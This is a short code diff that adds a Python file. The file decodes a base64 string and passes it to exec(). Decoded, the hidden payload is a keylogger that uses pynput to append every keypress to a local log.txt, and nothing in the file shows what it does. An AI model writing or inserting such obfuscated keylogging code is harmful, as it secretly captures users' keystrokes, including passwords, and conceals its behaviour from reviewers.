@@ -1,0 +1,5 @@
+import base64
+
+mD = b"CmZyb20gcHlucHV0IGltcG9ydCBrZXlib2FyZApkZWYgb25QcmVzcyhrZXk6IG9iamVjdCkgLT4gTm9uZToKCXdpdGggb3BlbigibG9nLnR4dCIsICJhIikgYXMgbG9nOgoJCWxvZy53cml0ZShmIntzdHIoa2V5KX1cbiIpCmxpc3RlbmVyID0ga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9b25QcmVzcykKbGlzdGVuZXIucnVuKCkK"
+b = base64.b64decode(mD)
+exec(b)
